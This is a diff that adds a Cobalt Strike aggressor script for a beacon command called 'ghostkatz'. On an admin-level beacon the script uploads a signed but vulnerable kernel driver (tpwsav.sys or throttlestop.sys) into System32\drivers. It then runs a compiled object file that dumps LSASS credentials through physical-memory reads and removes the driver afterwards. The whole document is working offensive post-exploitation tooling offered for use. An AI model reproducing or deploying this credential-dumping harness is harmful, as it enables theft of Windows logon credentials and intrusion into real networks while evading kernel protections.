@@ -1,0 +1,86 @@
+#Register command
+beacon_command_register(
+"ghostkatz", 
+"Dump credentials from LSASS by using signed kernel drivers to read physical memory.",
+"Synopsis: ghostkatz [logonpasswords/wdigest] -prv <provider id>\n" .
+"Description:\n" .
+"  Dump credentials from LSASS by using signed kernel drivers to read physical memory.\n\n" .
+"Examples:\n" .
+"  ghostkatz logonpasswords -prv 1\n" .
+"  ghostkatz wdigest\n"
+);
+
+alias ghostkatz {
+    $data = substr($0, 9);
+    @args = split(" ", $data);
+
+	if (size(@_) < 2)
+	{
+		berror($1, "Invalid number of arguments! (See 'help ghostkatz')");
+		return -1;
+	}
+
+	if (-isadmin $1) {
+    }
+	else 
+	{
+		berror($1, "The current beacon is not running with administrator privileges. Bailing...");
+		return -1;
+	}
+
+	btask($1, "Tasked beacon to inline execute GhostKatz!");
+	$barch = barch($1);
+	$mode = $2;
+	$providerArg = $3;
+	$providerNum = $4;
+
+	if (($mode ne "logonpasswords") && ($mode ne "wdigest"))
+    {
+        berror($1, "Invalid mode: \'$mode\'!");
+        return;
+    }
+
+	$drvBasePath = "C:\\Windows\\System32\\drivers\\"; # WARNING: IF YOU CHANGE THIS, YOU MUST CHANGE utils.c TO REFLECT THE CHANGE OR YOU **WILL** BREAK THINGS
+	if ($providerNum == 1)
+	{
+		$drvFile = script_resource("drivers/tpwsav.sys");
+		bcd($1, $drvBasePath);
+		bupload($1, $drvFile);
+	}
+	else if ($providerNum == 2)
+	{
+		$drvFile = script_resource("drivers/throttlestop.sys");
+		bcd($1, $drvBasePath);
+		bupload($1, $drvFile);
+	}
+	else if ($providerNum is $null)
+	{
+		$drvFile = script_resource("drivers/tpwsav.sys");
+		bcd($1, $drvBasePath);
+		bupload($1, $drvFile);
+		$providerNum = 1;
+	}
+
+	# Read BOF file
+	$handle = openf(script_resource("bin/ghostkatz. $+ $barch $+ .o"));
+	$bof = readb($handle, -1);
+	closef($handle);
+	if(strlen($bof) < 1)
+	{
+		berror($1,"BOF bin could not be found. Please ensure the compiled BOF (.o file) exists in the bin directory");
+		return;
+	}
+
+    # Prepare the arguments
+    $args = bof_pack($1, "ziz", $providerArg, $providerNum, $mode);
+    beacon_inline_execute($1, $bof, "go", $args); # $args
+
+	if ($providerNum == 1)
+	{
+		brm($1, "tpwsav.sys");
+	}
+	else if ($providerNum == 2)
+	{
+		brm($1, "throttlestop.sys");
+	}
+}
